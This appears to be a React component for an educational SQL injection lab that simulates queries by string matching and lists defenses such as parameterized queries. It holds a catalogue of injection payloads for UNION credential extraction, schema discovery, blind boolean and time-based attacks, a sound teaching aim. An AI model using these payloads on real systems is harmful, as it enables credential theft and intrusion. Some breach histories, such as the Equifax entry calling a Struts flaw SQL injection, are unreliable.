'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Database, Shield, AlertTriangle, Play, Eye, Lock, Terminal, FileText } from 'lucide-react'

export default function SQLInjectionLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [searchQuery, setSearchQuery] = useState('')
  const [queryResult, setQueryResult] = useState<any>(null)
  const [isAttacking, setIsAttacking] = useState(false)
  const [attackType, setAttackType] = useState('union')
  const [showSchema, setShowSchema] = useState(false)

  const databaseSchema = {
    users: [
      { id: 1, username: 'admin', password: 'admin123', role: 'admin' },
      { id: 2, username: 'user1', password: 'password1', role: 'user' },
      { id: 3, username: 'john', password: 'john123', role: 'user' },
      { id: 4, username: 'alice', password: 'alice456', role: 'user' }
    ],
    products: [
      { id: 1, name: 'Laptop', price: 999.99, category: 'Electronics' },
      { id: 2, name: 'Mouse', price: 29.99, category: 'Electronics' },
      { id: 3, name: 'Keyboard', price: 79.99, category: 'Electronics' }
    ]
  }

  const vulnerableQueries = {
    union: "SELECT * FROM users WHERE username = '{input}'",
    boolean: "SELECT * FROM users WHERE username = '{input}' AND password = 'password'",
    error: "SELECT * FROM users WHERE id = {input}",
    time: "SELECT * FROM users WHERE username = '{input}' AND SLEEP(3)"
  }

  const attackPayloads = {
    union: [
      { name: 'Basic Union', payload: "admin' UNION SELECT 1,username,password,role FROM users--", description: 'Extract user credentials' },
      { name: 'Column Count', payload: "admin' UNION SELECT 1,2,3,4--", description: 'Determine number of columns' },
      { name: 'Schema Discovery', payload: "admin' UNION SELECT table_name,column_name,data_type,1 FROM information_schema.columns--", description: 'Discover database schema' }
    ],
    boolean: [
      { name: 'Admin Check', payload: "admin' AND '1'='1", description: 'Always true condition' },
      { name: 'Password Length', payload: "admin' AND LENGTH(password) > 5--", description: 'Determine password length' },
      { name: 'Character Extraction', payload: "admin' AND SUBSTRING(password,1,1) = 'a'--", description: 'Extract password character by character' }
    ],
    error: [
      { name: 'Syntax Error', payload: "1'", description: 'Single quote to break query' },
      { name: 'Division by Zero', payload: "1/0", description: 'Mathematical error' },
      { name: 'Type Mismatch', payload: "'a'", description: 'String in numeric context' }
    ],
    time: [
      { name: 'Sleep Injection', payload: "admin'; SLEEP(5)--", description: 'Delay response by 5 seconds' },
      { name: 'Conditional Sleep', payload: "admin' AND IF(1=1,SLEEP(5),0)--", description: 'Conditional delay' },
      { name: 'Heavy Query', payload: "admin' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0--", description: 'CPU-intensive query' }
    ]
  }

  const executeQuery = (input: string) => {
    setIsAttacking(true)
    
    setTimeout(() => {
      try {
        // Simulate vulnerable SQL execution
        let result = null
        
        if (input.includes("UNION SELECT")) {
          // Union-based attack
          result = {
            type: 'union',
            data: databaseSchema.users,
            message: 'SQL Injection successful! User data extracted via UNION attack.',
            severity: 'high'
          }
        } else if (input.includes("AND") && (input.includes("1=1") || input.includes("LENGTH") || input.includes("SUBSTRING"))) {
          // Boolean-based attack
          result = {
            type: 'boolean',
            data: { condition: true, extracted: 'Password length: 7, First char: a' },
            message: 'Blind SQL Injection successful! Data extracted through boolean conditions.',
            severity: 'medium'
          }
        } else if (input.includes("'") || input.includes("/") || input === "'a'") {
          // Error-based attack
          result = {
            type: 'error',
            error: "SQL Syntax Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
            message: 'Error-based SQL Injection! Database error leaked information.',
            severity: 'high'
          }
        } else if (input.includes("SLEEP") || input.includes("IF")) {
          // Time-based attack
          result = {
            type: 'time',
            delay: '5000ms',
            message: 'Time-based SQL Injection detected! Response delayed by 5 seconds.',
            severity: 'medium'
          }
        } else if (input === 'admin') {
          // Normal query
          result = {
            type: 'normal',
            data: databaseSchema.users.find(u => u.username === 'admin'),
            message: 'Normal query executed successfully.',
            severity: 'low'
          }
        } else {
          result = {
            type: 'safe',
            data: [],
            message: 'No results found or input sanitized.',
            severity: 'low'
          }
        }
        
        setQueryResult(result)
      } catch (error) {
        setQueryResult({
          type: 'error',
          error: 'Query execution failed',
          message: 'Database error occurred',
          severity: 'high'
        })
      } finally {
        setIsAttacking(false)
      }
    }, 1500)
  }

  const realWorldAttacks = [
    {
      name: 'Adobe SQL Injection (2013)',
      description: 'Attackers exploited SQL injection in Adobe systems, compromising 38 million user accounts',
      technique: 'Union-based SQL injection',
      impact: 'Massive data breach, customer data exposure',
      example: 'SELECT * FROM users WHERE id = 1 UNION SELECT username,password,email,credit_card FROM users--'
    },
    {
      name: 'TalkTalk Data Breach (2015)',
      description: 'UK telecom company suffered SQL injection attack affecting 157,000 customers',
      technique: 'Blind SQL injection in web application',
      impact: 'Financial data theft, regulatory fines',
      example: 'Customer ID injection leading to database access'
    },
    {
      name: 'Equifax Vulnerability (2017)',
      description: 'Apache Struts vulnerability allowed SQL injection leading to massive breach',
      technique: 'Parameterized query bypass',
      impact: '143 million consumers affected, $700M in costs',
      example: 'Vulnerable web framework parameters exploited'
    }
  ]

  const defenseStrategies = [
    {
      name: 'Input Validation',
      description: 'Validate and sanitize all user inputs',
      techniques: [
        'Whitelist allowed characters',
        'Validate input format and length',
        'Reject special characters',
        'Use strict type checking'
      ]
    },
    {
      name: 'Parameterized Queries',
      description: 'Use prepared statements with parameter binding',
      techniques: [
        'Never concatenate user input in SQL',
        'Use ? placeholders or named parameters',
        'Bind variables separately from query',
        'Use ORM frameworks when possible'
      ]
    },
    {
      name: 'Least Privilege',
      description: 'Minimize database user permissions',
      techniques: [
        'Separate read/write accounts',
        'Avoid using admin accounts for apps',
        'Implement database-level access controls',
        'Regular permission audits'
      ]
    },
    {
      name: 'Web Application Firewall',
      description: 'Deploy WAF with SQL injection rules',
      techniques: [
        'Pattern-based detection',
        'Behavioral analysis',
        'Rate limiting',
        'Logging and monitoring'
      ]
    }
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-blue-500 rounded-lg">
              <Database className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-slate-900">SQL Injection Lab</h1>
              <p className="text-slate-600">Learn how attackers exploit database vulnerabilities and how to prevent them</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              SQL Injection remains one of the most critical web vulnerabilities. This lab demonstrates various injection techniques and defense mechanisms.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="demo">Injection Demo</TabsTrigger>
            <TabsTrigger value="attacks">Real-World Attacks</TabsTrigger>
            <TabsTrigger value="defense">Defense Strategies</TabsTrigger>
            <TabsTrigger value="schema">Database Schema</TabsTrigger>
          </TabsList>

          {/* Injection Demo Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Attack Control Panel */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Terminal className="w-5 h-5" />
                    <span>SQL Injection Control</span>
                  </CardTitle>
                  <CardDescription>
                    Execute SQL injection attacks against vulnerable queries
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    <div>
                      <label className="text-sm font-medium mb-2 block">Attack Type</label>
                      <div className="grid grid-cols-2 gap-2">
                        {Object.keys(attackPayloads).map((type) => (
                          <Button
                            key={type}
                            onClick={() => setAttackType(type)}
                            variant={attackType === type ? 'default' : 'outline'}
                            size="sm"
                            className="capitalize"
                          >
                            {type}
                          </Button>
                        ))}
                      </div>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">Vulnerable Query</label>
                      <Code className="block p-3 bg-slate-50 rounded text-sm">
                        {vulnerableQueries[attackType as keyof typeof vulnerableQueries]}
                      </Code>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">Attack Payloads</label>
                      <div className="space-y-2 max-h-48 overflow-y-auto">
                        {attackPayloads[attackType as keyof typeof attackPayloads].map((payload, index) => (
                          <div
                            key={index}
                            className="p-2 border rounded cursor-pointer hover:bg-slate-50"
                            onClick={() => setSearchQuery(payload.payload)}
                          >
                            <div className="font-medium text-sm">{payload.name}</div>
                            <div className="text-xs text-slate-600">{payload.description}</div>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">Input Value</label>
                      <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        placeholder="Enter attack payload or try 'admin' for normal query"
                        className="w-full p-2 border rounded-md"
                      />
                    </div>

                    <Button
                      onClick={() => executeQuery(searchQuery)}
                      disabled={!searchQuery.trim() || isAttacking}
                      className="w-full"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      {isAttacking ? 'Executing...' : 'Execute Query'}
                    </Button>
                  </div>
                </CardContent>
              </Card>

              {/* Query Results */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Eye className="w-5 h-5" />
                    <span>Query Results</span>
                  </CardTitle>
                  <CardDescription>
                    Database response and attack analysis
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {queryResult ? (
                    <div className="space-y-4">
                      <div className={`p-3 rounded-lg ${
                        queryResult.severity === 'high' ? 'bg-red-50 border-red-200' :
                        queryResult.severity === 'medium' ? 'bg-yellow-50 border-yellow-200' :
                        'bg-green-50 border-green-200'
                      }`}>
                        <div className="flex items-center space-x-2 mb-2">
                          <Shield className="w-4 h-4" />
                          <span className="font-medium text-sm">Attack Analysis</span>
                        </div>
                        <p className="text-sm">{queryResult.message}</p>
                        <Badge variant={queryResult.severity === 'high' ? 'destructive' : 'default'} className="mt-2">
                          {queryResult.type.toUpperCase()}
                        </Badge>
                      </div>

                      {queryResult.data && (
                        <div className="space-y-2">
                          <h4 className="font-semibold text-sm">Extracted Data:</h4>
                          {Array.isArray(queryResult.data) ? (
                            <div className="overflow-x-auto">
                              <table className="w-full text-xs border">
                                <thead>
                                  <tr className="bg-slate-50">
                                    <th className="border p-2">ID</th>
                                    <th className="border p-2">Username</th>
                                    <th className="border p-2">Password</th>
                                    <th className="border p-2">Role</th>
                                  </tr>
                                </thead>
                                <tbody>
                                  {queryResult.data.map((row: any, index: number) => (
                                    <tr key={index}>
                                      <td className="border p-2">{row.id}</td>
                                      <td className="border p-2">{row.username}</td>
                                      <td className="border p-2">{row.password}</td>
                                      <td className="border p-2">{row.role}</td>
                                    </tr>
                                  ))}
                                </tbody>
                              </table>
                            </div>
                          ) : (
                            <Code className="block p-2 bg-slate-50 rounded text-xs">
                              {JSON.stringify(queryResult.data, null, 2)}
                            </Code>
                          )}
                        </div>
                      )}

                      {queryResult.error && (
                        <div className="p-3 bg-red-50 border border-red-200 rounded">
                          <h4 className="font-semibold text-sm mb-1">Database Error:</h4>
                          <Code className="text-xs text-red-700">{queryResult.error}</Code>
                        </div>
                      )}

                      {queryResult.delay && (
                        <div className="p-3 bg-yellow-50 border border-yellow-200 rounded">
                          <h4 className="font-semibold text-sm mb-1">Response Delay:</h4>
                          <p className="text-sm">{queryResult.delay}</p>
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="text-center text-slate-500 py-8">
                      <Database className="w-12 h-12 mx-auto mb-4 opacity-50" />
                      <p>Execute a query to see results</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Real-World Attacks Tab */}
          <TabsContent value="attacks" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {realWorldAttacks.map((attack, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="text-lg">{attack.name}</CardTitle>
                    <Badge variant="destructive">Critical</Badge>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <p className="text-sm text-slate-600">{attack.description}</p>
                    
                    <div className="space-y-2">
                      <div>
                        <span className="font-semibold text-sm">Technique:</span>
                        <p className="text-xs text-slate-600">{attack.technique}</p>
                      </div>
                      
                      <div>
                        <span className="font-semibold text-sm">Impact:</span>
                        <p className="text-xs text-slate-600">{attack.impact}</p>
                      </div>
                      
                      <div>
                        <span className="font-semibold text-sm">Example:</span>
                        <Code className="block text-xs mt-1">{attack.example}</Code>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Defense Strategies Tab */}
          <TabsContent value="defense" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {defenseStrategies.map((strategy, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <Shield className="w-5 h-5" />
                      <span>{strategy.name}</span>
                    </CardTitle>
                    <CardDescription>{strategy.description}</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Implementation:</h4>
                      <ul className="space-y-1">
                        {strategy.techniques.map((technique, techIndex) => (
                          <li key={techIndex} className="flex items-start space-x-2">
                            <div className="w-1.5 h-1.5 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                            <span className="text-sm">{technique}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Database Schema Tab */}
          <TabsContent value="schema" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <FileText className="w-5 h-5" />
                    <span>Users Table</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm border">
                      <thead>
                        <tr className="bg-slate-50">
                          <th className="border p-2">ID</th>
                          <th className="border p-2">Username</th>
                          <th className="border p-2">Password</th>
                          <th className="border p-2">Role</th>
                        </tr>
                      </thead>
                      <tbody>
                        {databaseSchema.users.map((user, index) => (
                          <tr key={index}>
                            <td className="border p-2">{user.id}</td>
                            <td className="border p-2">{user.username}</td>
                            <td className="border p-2">{user.password}</td>
                            <td className="border p-2">{user.role}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <FileText className="w-5 h-5" />
                    <span>Products Table</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm border">
                      <thead>
                        <tr className="bg-slate-50">
                          <th className="border p-2">ID</th>
                          <th className="border p-2">Name</th>
                          <th className="border p-2">Price</th>
                          <th className="border p-2">Category</th>
                        </tr>
                      </thead>
                      <tbody>
                        {databaseSchema.products.map((product, index) => (
                          <tr key={index}>
                            <td className="border p-2">{product.id}</td>
                            <td className="border p-2">{product.name}</td>
                            <td className="border p-2">${product.price}</td>
                            <td className="border p-2">{product.category}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}